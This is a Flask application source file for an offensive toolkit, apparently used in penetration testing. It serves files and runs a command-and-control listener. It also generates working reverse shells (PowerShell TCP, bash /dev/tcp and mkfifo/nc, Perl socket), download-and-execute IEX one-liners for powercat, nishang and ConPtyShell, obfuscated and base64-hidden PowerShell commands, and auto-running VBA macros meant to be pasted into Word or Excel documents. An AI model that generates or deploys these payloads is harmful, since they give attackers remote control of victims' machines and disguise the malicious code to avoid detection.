from flask import Flask, jsonify, request, send_from_directory, abort, render_template
import os
import netifaces as ni
from listen_manager import start_listener, stop_listener, send_command
from exceptions import (
    PathTraversalError,
    FileSizeLimitError,
    ListenerStartError,
    InvalidInputError
)
from logging_config import get_logger
from validators import (
    validate_filename,
    validate_path_in_directory,
    validate_port,
    validate_clipboard_index,
    validate_content_size,
    validate_command,
    sanitize_log_message
)
from security_headers import configure_security
from config import Config
from rate_limiter import rate_limit, strict_limiter, auth_limiter, get_rate_limit_status

# Initialize configuration
Config.init_app()

# Initialize logger
logger = get_logger('flask_app')

# Create Flask app
app = Flask(__name__)

# Apply Flask configuration
Config.init_app(app)

# Configure security headers
configure_security(app, use_https=Config.USE_HTTPS)

# Configuration shortcuts
MAX_FILE_SIZE = Config.MAX_FILE_SIZE
MAX_CLIPBOARD_SIZE = Config.MAX_CLIPBOARD_SIZE
TOOLS_FOLDER = Config.TOOLS_FOLDER
UPLOAD_FOLDER = Config.UPLOAD_FOLDER
DOWNLOAD_FOLDER = Config.DOWNLOAD_FOLDER
SHELLPY_FOLDER = os.path.join(Config.BASE_DIR, 'shellpy_output')
os.makedirs(SHELLPY_FOLDER, exist_ok=True)

# Initialize clipboards
clipboards = ["" for _ in range(Config.NUM_CLIPBOARDS)]

# Connected users (in-memory)
connected_users = {}  # {username: {ip, joined, last_seen}}

# File serve sessions (in-memory)
import datetime, uuid
serve_sessions = {}  # {id: {filename, folder, max_downloads, downloads, log[], active}}


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload/<path:filename>', methods=['PUT', 'POST'])
@rate_limit(strict_limiter)  # Limit uploads to prevent abuse
def upload_file(filename):
    try:
        # Security: Validate filename
        validated_filename = validate_filename(filename)
        filepath = os.path.join(UPLOAD_FOLDER, validated_filename)

        # Security: Ensure the final path is within UPLOAD_FOLDER
        validate_path_in_directory(filepath, UPLOAD_FOLDER)

        if request.method == 'PUT':
            # PUT: sube datos "raw"
            with open(filepath, 'wb') as f:
                f.write(request.data)
            logger.info(f"File {sanitize_log_message(validated_filename)} uploaded via PUT from {request.remote_addr}")
            return f'File {validated_filename} uploaded via PUT.', 200

        elif request.method == 'POST':
            # POST: maneja multipart/form-data
            if 'file' not in request.files:
                return 'No file part', 400
            file = request.files['file']
            if file.filename == '':
                return 'No selected file', 400
            file.save(filepath)
            logger.info(f"File {sanitize_log_message(validated_filename)} uploaded via POST from {request.remote_addr}")
            return f'File {validated_filename} uploaded via POST.', 200

    except (PathTraversalError, InvalidInputError) as e:
        logger.warning(f"Validation error in upload: {sanitize_log_message(str(e))} from {request.remote_addr}")
        abort(400, str(e))

@app.route('/download/<path:filename>', methods=['GET'])
def download_file(filename):
    try:
        # Security: Validate filename
        validated_filename = validate_filename(filename)
        filepath = os.path.join(DOWNLOAD_FOLDER, validated_filename)

        # Security: Ensure the final path is within DOWNLOAD_FOLDER
        validate_path_in_directory(filepath, DOWNLOAD_FOLDER)

        logger.info(f"File {sanitize_log_message(validated_filename)} downloaded by {request.remote_addr}")
        return send_from_directory(DOWNLOAD_FOLDER, validated_filename, as_attachment=True)

    except (PathTraversalError, InvalidInputError) as e:
        logger.warning(f"Validation error in download: {sanitize_log_message(str(e))} from {request.remote_addr}")
        abort(400, str(e))
    except FileNotFoundError:
        logger.warning(f"File not found for download: {sanitize_log_message(filename)}")
        abort(404)


@app.route('/tools')
def tools():
    files = os.listdir(TOOLS_FOLDER)
    return render_template('tools.html', files=files)

@app.route('/read_tool', methods=['POST'])
def read_tool():
    filename = request.form.get('filename')

    # Security: Prevent path traversal
    if not filename or '..' in filename or filename.startswith('/'):
        return jsonify({"error": "Invalid filename"}), 400

    filepath = os.path.join(TOOLS_FOLDER, filename)

    # Security: Ensure within TOOLS_FOLDER
    abs_tools = os.path.abspath(TOOLS_FOLDER) + os.sep
    abs_filepath = os.path.abspath(filepath)
    if not abs_filepath.startswith(abs_tools):
        return jsonify({"error": "Invalid path"}), 400

    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        return jsonify({"content": content})
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    except PermissionError:
        return jsonify({"error": "Permission denied"}), 403
    except Exception as e:
        return jsonify({"error": "Internal error"}), 500

@app.route('/save_tool', methods=['POST'])
def save_tool():
    filename = request.form.get('filename')
    content = request.form.get('content')

    # Security: Prevent path traversal
    if not filename or '..' in filename or filename.startswith('/'):
        return jsonify({"error": "Invalid filename"}), 400

    filepath = os.path.join(TOOLS_FOLDER, filename)

    # Security: Ensure within TOOLS_FOLDER
    abs_tools = os.path.abspath(TOOLS_FOLDER) + os.sep
    abs_filepath = os.path.abspath(filepath)
    if not abs_filepath.startswith(abs_tools):
        return jsonify({"error": "Invalid path"}), 400

    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        return jsonify({"status": "saved"})
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    except PermissionError:
        return jsonify({"error": "Permission denied"}), 403
    except Exception as e:
        return jsonify({"error": "Internal error"}), 500


@app.route('/files', methods=['GET'])
def list_files():
    files = os.listdir(TOOLS_FOLDER)
    return jsonify(files)

@app.route('/files/<filename>', methods=['GET', 'PUT'])
def handle_file(filename):
    # Security: Prevent path traversal
    if not filename or '..' in filename or filename.startswith('/'):
        return jsonify({"error": "Invalid filename"}), 400

    filepath = os.path.join(TOOLS_FOLDER, filename)

    # Security: Ensure within TOOLS_FOLDER
    abs_tools = os.path.abspath(TOOLS_FOLDER) + os.sep
    abs_filepath = os.path.abspath(filepath)
    if not abs_filepath.startswith(abs_tools):
        return jsonify({"error": "Invalid path"}), 400

    if request.method == 'GET':
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
            return jsonify({"content": content})
        except FileNotFoundError:
            return jsonify({"error": "File not found"}), 404
        except UnicodeDecodeError:
            # Binary file — return metadata instead of content
            size = os.path.getsize(filepath)
            return jsonify({"content": f"[Binary file: {filename} ({size} bytes)]", "binary": True})
        except Exception as e:
            return jsonify({"error": "Internal error"}), 500

    if request.method == 'PUT':
        try:
            data = request.get_json()
            if not data or 'content' not in data:
                return jsonify({"error": "No content provided"}), 400
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(data['content'])
            return jsonify({"message": "File saved"})
        except Exception as e:
            return jsonify({"error": "Internal error"}), 500

@app.route('/clipboards', methods=['GET'])
def get_clipboards():
    return jsonify(clipboards)

@app.route('/clipboards/<int:index>', methods=['PUT'])
def update_clipboard(index):
    try:
        # Validate clipboard index
        validated_index = validate_clipboard_index(index, len(clipboards))

        data = request.get_json()
        if not data or not isinstance(data, dict):
            return jsonify({"error": "Request body must be JSON with 'content' field"}), 400
        content = data.get('content', '')

        # Security: Validate content size
        validated_content = validate_content_size(content, MAX_CLIPBOARD_SIZE, "clipboard")

        clipboards[validated_index] = validated_content
        logger.info(f"Clipboard {validated_index} updated from {request.remote_addr}")
        return jsonify({"message": "Clipboard updated"})

    except InvalidInputError as e:
        logger.warning(f"Invalid clipboard update: {str(e)} from {request.remote_addr}")
        return jsonify({"error": str(e)}), 400

@app.route('/ips', methods=['GET'])
def get_ips():
    ips = []
    for iface in ni.interfaces():
        if ni.AF_INET in ni.ifaddresses(iface):
            for link in ni.ifaddresses(iface)[ni.AF_INET]:
                ips.append(link['addr'])
    return jsonify(ips)


@app.route('/api/users', methods=['GET'])
def list_users():
    """List all connected users."""
    return jsonify(list(connected_users.keys()))


@app.route('/api/users', methods=['POST'])
def register_user():
    """Register or update a user."""
    import datetime
    data = request.get_json()
    username = data.get('username', '').strip()
    if not username or len(username) > 30:
        return jsonify({"error": "Invalid username"}), 400
    # Sanitize: alphanumeric, underscores, hyphens
    import re
    if not re.match(r'^[a-zA-Z0-9_\-]+$', username):
        return jsonify({"error": "Username: letters, numbers, _ and - only"}), 400
    connected_users[username] = {
        "ip": request.remote_addr,
        "joined": connected_users.get(username, {}).get("joined", datetime.datetime.now().isoformat()),
        "last_seen": datetime.datetime.now().isoformat()
    }
    logger.info(f"User '{username}' registered from {request.remote_addr}")
    return jsonify({"status": "ok", "username": username})


@app.route('/api/users/<username>/ping', methods=['POST'])
def ping_user(username):
    """Update last_seen for a user."""
    import datetime
    if username in connected_users:
        connected_users[username]["last_seen"] = datetime.datetime.now().isoformat()
    return jsonify({"status": "ok"})


@app.route('/api/serve', methods=['GET'])
def list_serves():
    """List active serve sessions."""
    result = []
    for sid, s in serve_sessions.items():
        remaining = s["max_downloads"] - s["downloads"] if s["max_downloads"] > 0 else -1
        result.append({
            "id": sid,
            "filename": s["filename"],
            "served_as": s.get("served_as", s["filename"]),
            "url_path": s.get("url_path", ""),
            "folder": s["folder"],
            "max_downloads": s["max_downloads"],
            "downloads": s["downloads"],
            "remaining": remaining,
            "active": s["active"],
            "password": s.get("password", ""),
            "log": s["log"][-30:],
            "created": s.get("created", ""),
            "url": f"/serve/{sid}/{s.get('served_as', s['filename'])}"
        })
    return jsonify(result)


@app.route('/api/serve', methods=['POST'])
def create_serve():
    """Create a new file serve session with full options."""
    data = request.get_json()
    filename = data.get('filename', '').strip()
    folder = data.get('folder', 'tools')
    max_dl = int(data.get('max_downloads', 0))
    served_as = data.get('served_as', '').strip() or filename
    url_path = data.get('url_path', '').strip()
    password = data.get('password', '').strip()

    if not filename:
        return jsonify({"error": "No filename"}), 400

    # Security: Validate filename to prevent path traversal
    try:
        validated_filename = validate_filename(filename)
        validated_served_as = validate_filename(served_as)
    except (PathTraversalError, InvalidInputError) as e:
        logger.warning(f"Validation error in serve create: {sanitize_log_message(str(e))} from {request.remote_addr}")
        return jsonify({"error": str(e)}), 400

    base = TOOLS_FOLDER if folder == 'tools' else DOWNLOAD_FOLDER
    filepath = os.path.join(base, validated_filename)

    # Security: Ensure the final path is within the allowed directory
    try:
        validate_path_in_directory(filepath, base)
    except PathTraversalError as e:
        logger.warning(f"Path traversal in serve create: {sanitize_log_message(str(e))} from {request.remote_addr}")
        return jsonify({"error": "Invalid path"}), 400

    if not os.path.exists(filepath):
        return jsonify({"error": "File not found"}), 404

    sid = uuid.uuid4().hex[:8]
    serve_sessions[sid] = {
        "filename": validated_filename,
        "served_as": validated_served_as,
        "url_path": url_path,
        "folder": folder,
        "max_downloads": max_dl,
        "downloads": 0,
        "active": True,
        "password": password,
        "log": [],
        "created": datetime.datetime.now().isoformat()
    }
    url = f"/serve/{sid}/{validated_served_as}"
    logger.info(f"Serve {sid}: {sanitize_log_message(validated_filename)} as {sanitize_log_message(validated_served_as)} (max:{max_dl}, auth:{'yes' if password else 'no'})")
    return jsonify({"id": sid, "url": url})


@app.route('/api/serve/<sid>', methods=['DELETE'])
def stop_serve(sid):
    """Stop a serve session."""
    if sid in serve_sessions:
        serve_sessions[sid]["active"] = False
        return jsonify({"status": "stopped"})
    return jsonify({"error": "Not found"}), 404


@app.route('/serve/<sid>/<path:filename>', methods=['GET'])
def serve_file(sid, filename):
    """Serve a file with tracking, burn-after-read, and optional auth."""
    if sid not in serve_sessions:
        abort(404)
    session = serve_sessions[sid]

    if not session["active"]:
        abort(404)
    if session["max_downloads"] > 0 and session["downloads"] >= session["max_downloads"]:
        session["active"] = False
        abort(404)

    # Password protection (HTTP Basic Auth)
    if session.get("password"):
        auth = request.authorization
        if not auth or auth.password != session["password"]:
            return ('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="File Download"'})

    base = TOOLS_FOLDER if session["folder"] == 'tools' else DOWNLOAD_FOLDER

    # Security: Validate stored filename hasn't been tampered with
    try:
        validate_path_in_directory(os.path.join(base, session["filename"]), base)
    except PathTraversalError:
        logger.warning(f"Path traversal blocked in serve {sid} from {request.remote_addr}")
        abort(403)

    session["downloads"] += 1
    session["log"].append({
        "ip": request.remote_addr,
        "ua": request.headers.get("User-Agent", "")[:80],
        "time": datetime.datetime.now().isoformat(),
        "count": session["downloads"]
    })
    logger.info(f"Serve {sid}: {session['filename']} dl by {request.remote_addr} ({session['downloads']}/{session['max_downloads'] or 'inf'})")

    if session["max_downloads"] > 0 and session["downloads"] >= session["max_downloads"]:
        session["active"] = False

    return send_from_directory(base, session["filename"], as_attachment=True,
                               download_name=session.get("served_as", session["filename"]))


@app.route("/shells")
def shells():
    return render_template("shells.html")

@app.route("/utilities")
def utilities():
    return render_template("utilities.html")

@app.route("/toolkit")
def toolkit():
    return render_template("toolkit.html")


@app.route("/api/shellpy", methods=["POST"])
def shellpy_api():
    """Run shellpy obfuscation on payloads."""
    import sys
    data = request.get_json()
    payload = data.get("payload", "")
    ip = data.get("ip", "")
    port = data.get("port", "")
    action = data.get("action", "obfuscate")  # obfuscate, base64, macro

    if not payload:
        return jsonify({"error": "No payload"}), 400

    results = []

    # Add shellpy dir to path for imports
    shellpy_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shellpy")
    if shellpy_dir not in sys.path:
        sys.path.insert(0, shellpy_dir)

    def _load_shellpy_obfuscate():
        from shellpy_module import obfuscate
        return obfuscate

    try:
        if action == "obfuscate_ps":
            obfuscate = _load_shellpy_obfuscate()
            obfuscated = obfuscate(payload, port=port if port else None)
            results.append({"name": "Obfuscated (vars+iex+IP hex+port hex)", "payload": obfuscated})
            # Also base64 encode the obfuscated version
            b64 = _ps_base64(obfuscated)
            results.append({"name": "Obfuscated + Base64", "payload": f"powershell -nop -w hidden -enc {b64}"})

        elif action == "base64_ps":
            b64 = _ps_base64(payload)
            results.append({"name": "Base64 Encoded", "payload": f"powershell -nop -w hidden -enc {b64}"})

        elif action == "macro":
            b64 = _ps_base64(payload)
            macro_code = _generate_macro(b64)
            results.append({"name": "VBA Macro (paste in Word/Excel)", "payload": macro_code})

        elif action == "obfuscate_bash":
            from shobfuscator import obfuscateBash
            variants = obfuscateBash(payload, ip=ip if ip else None, port=port if port else None)
            for name, variant in variants:
                results.append({"name": name, "payload": variant})

        elif action == "obfuscate_perl":
            from shobfuscator import obfuscatePerl
            variants = obfuscatePerl(payload, ip=ip if ip else None, port=port if port else None)
            for name, variant in variants:
                results.append({"name": name, "payload": variant})

        elif action == "obfuscate_ps_macro":
            obfuscate = _load_shellpy_obfuscate()
            obfuscated = obfuscate(payload, port=port if port else None)
            b64 = _ps_base64(obfuscated)
            macro_code = _generate_macro(b64)
            results.append({"name": "Obfuscated", "payload": obfuscated})
            results.append({"name": "Obfuscated + Base64", "payload": f"powershell -nop -w hidden -enc {b64}"})
            results.append({"name": "VBA Macro", "payload": macro_code})

        else:
            return jsonify({"error": f"Unknown action: {action}"}), 400

    except Exception as e:
        logger.exception(f"Shellpy error from {request.remote_addr}")
        return jsonify({"error": "Internal obfuscation error"}), 500

    return jsonify({"results": results})


def _ps_base64(payload):
    """UTF-16LE encode + base64 for PowerShell -enc."""
    import base64
    encoded = payload.encode("utf-16-le")
    return base64.b64encode(encoded).decode()


def _generate_macro(b64_payload, chunk_size=31):
    """Generate VBA macro from base64 payload."""
    chunks = [b64_payload[i:i+chunk_size] for i in range(0, len(b64_payload), chunk_size)]
    lines = []
    lines.append("Sub AutoOpen()")
    lines.append("\tMyMacro")
    lines.append("End Sub")
    lines.append("")
    lines.append("Sub Document_Open()")
    lines.append("\tMyMacro")
    lines.append("End Sub")
    lines.append("")
    lines.append("Sub MyMacro()")
    lines.append("\tDim Str As String")
    lines.append("")
    for i, chunk in enumerate(chunks):
        if i == 0:
            lines.append(f'\tStr = "powershell.exe -nop -w hidden -enc {chunk}"')
        else:
            lines.append(f'\tStr = Str + "{chunk}"')
    lines.append("")
    lines.append('\tCreateObject("Wscript.Shell").Run Str')
    lines.append("End Sub")
    return "\n".join(lines)

@app.route('/api/shellpy/generate', methods=['POST'])
def shellpy_generate():
    """Generate shellpy payloads, save to shellpy_output/, return file list."""
    # Note: no shell exec here — all generation uses pure Python string manipulation
    import sys
    data = request.get_json()
    ip = data.get('ip', '').strip()
    port = data.get('port', '').strip()
    shell_type = data.get('shell_type', 'all')

    if not ip or not port:
        return jsonify({"error": "IP and port required"}), 400

    shellpy_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "shellpy")
    if shellpy_dir not in sys.path:
        sys.path.insert(0, shellpy_dir)

    files_created = []
    p = int(port)

    try:
        from shellpy_module import obfuscate
        from shobfuscator import obfuscateBash, obfuscatePerl

        if shell_type in ('powershell', 'all'):
            ps = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + str(p) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            _save_sp('ps_revshell.ps1', ps, files_created)
            obf = obfuscate(ps, port=port)
            _save_sp('ps_revshell_obf.ps1', obf, files_created)
            b64 = _ps_base64(obf)
            _save_sp('ps_revshell_b64.txt', 'powershell -nop -w hidden -enc ' + b64, files_created)
            _save_sp('ps_revshell_macro.vba', _generate_macro(b64), files_created)

        if shell_type in ('powercat', 'all'):
            pc = "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/powercat.ps1'); powercat -c " + ip + " -p " + str(p) + " -e powershell"
            _save_sp('powercat_iex.ps1', pc, files_created)
            obf = obfuscate(pc, port=port)
            _save_sp('powercat_obf.ps1', obf, files_created)
            _save_sp('powercat_b64.txt', 'powershell -nop -w hidden -enc ' + _ps_base64(obf), files_created)
            _save_sp('powercat_macro.vba', _generate_macro(_ps_base64(obf)), files_created)

        if shell_type in ('nishang', 'all'):
            ni = "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress " + ip + " -Port " + str(p)
            _save_sp('nishang_iex.ps1', ni, files_created)
            obf = obfuscate(ni, port=port)
            _save_sp('nishang_obf.ps1', obf, files_created)
            _save_sp('nishang_b64.txt', 'powershell -nop -w hidden -enc ' + _ps_base64(obf), files_created)
            _save_sp('nishang_macro.vba', _generate_macro(_ps_base64(obf)), files_created)

        if shell_type in ('conpty', 'all'):
            cp = "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp " + ip + " -RemotePort " + str(p) + " -Rows 50 -Cols 120"
            _save_sp('conpty_iex.ps1', cp, files_created)
            obf = obfuscate(cp, port=port)
            _save_sp('conpty_obf.ps1', obf, files_created)
            _save_sp('conpty_b64.txt', 'powershell -nop -w hidden -enc ' + _ps_base64(obf), files_created)

        if shell_type in ('bash', 'all'):
            for fname, pay in [("bash_rsh.sh", "bash -i >& /dev/tcp/" + ip + "/" + str(p) + " 0>&1"), ("bash_mkfifo.sh", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + str(p) + " >/tmp/f")]:
                _save_sp(fname, pay, files_created)
                for name, variant in obfuscateBash(pay, ip=ip, port=port):
                    _save_sp(fname.replace('.sh', '_' + name.replace(' ', '_') + '.sh'), variant, files_created)

        if shell_type in ('perl', 'all'):
            pp = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + str(p) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            _save_sp('perl_rsh.sh', pp, files_created)
            for name, variant in obfuscatePerl(pp, ip=ip, port=port):
                _save_sp('perl_' + name.replace(' ', '_') + '.sh', variant, files_created)

    except Exception as e:
        return jsonify({"error": str(e)}), 500

    return jsonify({"files": files_created, "count": len(files_created)})


def _save_sp(filename, content, file_list):
    with open(os.path.join(SHELLPY_FOLDER, filename), 'w', encoding='utf-8') as f:
        f.write(content)
    file_list.append(filename)


@app.route('/api/shellpy/files', methods=['GET'])
def list_shellpy_files():
    files = os.listdir(SHELLPY_FOLDER) if os.path.exists(SHELLPY_FOLDER) else []
    return jsonify([f for f in files if not f.startswith('.')])


@app.route('/api/shellpy/files/<filename>', methods=['GET'])
def get_shellpy_file(filename):
    try:
        validated_filename = validate_filename(filename)
        filepath = os.path.join(SHELLPY_FOLDER, validated_filename)
        validate_path_in_directory(filepath, SHELLPY_FOLDER)
    except (PathTraversalError, InvalidInputError) as e:
        return jsonify({"error": "Invalid filename"}), 400
    if not os.path.exists(filepath):
        return jsonify({"error": "Not found"}), 404
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return jsonify({"content": f.read(), "filename": validated_filename})
    except UnicodeDecodeError:
        return jsonify({"error": "Binary file cannot be read as text"}), 400


@app.route('/api/shellpy/files/<filename>', methods=['DELETE'])
def delete_shellpy_file(filename):
    try:
        validated_filename = validate_filename(filename)
        filepath = os.path.join(SHELLPY_FOLDER, validated_filename)
        validate_path_in_directory(filepath, SHELLPY_FOLDER)
    except (PathTraversalError, InvalidInputError) as e:
        return jsonify({"error": "Invalid filename"}), 400
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({"status": "deleted"})
    return jsonify({"error": "Not found"}), 404


@app.route('/api/shellpy/clear', methods=['POST'])
@rate_limit(auth_limiter)  # Destructive operation - strict rate limit
def clear_shellpy_files():
    for f in os.listdir(SHELLPY_FOLDER):
        fpath = os.path.join(SHELLPY_FOLDER, f)
        if os.path.isfile(fpath):
            os.remove(fpath)
    logger.info(f"Shellpy files cleared by {request.remote_addr}")
    return jsonify({"status": "cleared"})


@app.route('/download/shellpy/<filename>', methods=['GET'])
def download_shellpy_file(filename):
    try:
        validated_filename = validate_filename(filename)
        filepath = os.path.join(SHELLPY_FOLDER, validated_filename)
        validate_path_in_directory(filepath, SHELLPY_FOLDER)
    except (PathTraversalError, InvalidInputError):
        abort(400)
    return send_from_directory(SHELLPY_FOLDER, validated_filename, as_attachment=True)


@app.route("/chat")
def chat():
    return render_template("chat.html")

@app.route("/configuration")
def configuration():
    return render_template("configuration.html")

@app.route("/start_listener/<int:port>")
@rate_limit(auth_limiter)  # Strictly limit listener starts
def start_listener_route(port):
    try:
        # Security: Validate port range
        validated_port = validate_port(port)

        mode = request.args.get('mode', 'tcp')
        if mode not in ('tcp', 'ssl'):
            mode = 'tcp'

        logger.info(f"Starting {mode.upper()} listener on port {validated_port}")
        conn, ok = start_listener(validated_port, mode=mode)

        if not ok or conn is None:
            logger.error(f"Failed to start listener on port {validated_port}")
            return jsonify({"error": "Failed to start listener"}), 500

        ip = conn.rhost
        logger.info(f"Listener started on port {validated_port}, connection from {ip}")
        return jsonify({"status": "started", "ip": ip}), 200

    except InvalidInputError as e:
        logger.warning(f"Invalid port validation: {str(e)} from {request.remote_addr}")
        return jsonify({"error": str(e)}), 400
    except ListenerStartError as e:
        logger.error(f"ListenerStartError: {e}")
        return jsonify({"error": f"Failed to start listener: {str(e)}"}), 500
    except Exception as e:
        logger.exception(f"Unexpected error starting listener")
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500


@app.route("/send_command", methods=["POST"])
@rate_limit(strict_limiter)  # Limit command execution
def send_command_route():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Request body must be JSON"}), 400

    cmd = data.get("command", "")

    try:
        validated_cmd = validate_command(cmd)
    except InvalidInputError as e:
        return jsonify({"error": str(e)}), 400

    logger.info(f"Command executed from {request.remote_addr}: {sanitize_log_message(validated_cmd[:100])}")
    result = send_command(validated_cmd)

    # Si es un diccionario (descarga o subida de archivo)
    if isinstance(result, dict):
        return jsonify(result)

    # Si es una cadena (output de la shell)
    return jsonify({
        "type": "output",
        "output": result
    })


@app.route("/stop_listener", methods=["GET", "POST"])
@rate_limit(auth_limiter)  # Limit state-changing operations
def stop_listener_route():
    stop_listener()
    return jsonify({"status": "stopped"})


@app.route("/api/rate_limit_status")
def rate_limit_status():
    """Get current rate limit status for the requesting IP."""
    ip = request.remote_addr
    status = get_rate_limit_status(ip)
    return jsonify(status)


@app.route("/health")
def health_check():
    """Health check endpoint for monitoring."""
    import sys

    health_status = {
        "status": "healthy",
        "version": "1.0.0",
        "python_version": f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}",
        "directories": {
            "tools": os.path.exists(TOOLS_FOLDER),
            "uploads": os.path.exists(UPLOAD_FOLDER),
            "downloads": os.path.exists(DOWNLOAD_FOLDER)
        },
        "configuration": {
            "debug_mode": Config.FLASK_DEBUG,
            "https_enabled": Config.USE_HTTPS,
            "max_file_size_mb": Config.MAX_FILE_SIZE / (1024 * 1024),
        }
    }

    # Check if all directories exist
    all_dirs_ok = all(health_status["directories"].values())

    if not all_dirs_ok:
        health_status["status"] = "degraded"
        logger.warning("Health check: Some directories are missing")

    status_code = 200 if health_status["status"] == "healthy" else 503
    return jsonify(health_status), status_code


if __name__ == '__main__':
    # Print configuration
    if Config.FLASK_DEBUG:
        Config.print_config()

    # Security: Never enable debug mode by default in production
    if Config.FLASK_DEBUG:
        logger.warning("⚠️  Debug mode is ENABLED - do not use in production!")

    logger.info(f"Starting Flask application on {Config.FLASK_HOST}:{Config.FLASK_PORT}")
    app.run(host=Config.FLASK_HOST, port=Config.FLASK_PORT, debug=Config.FLASK_DEBUG)
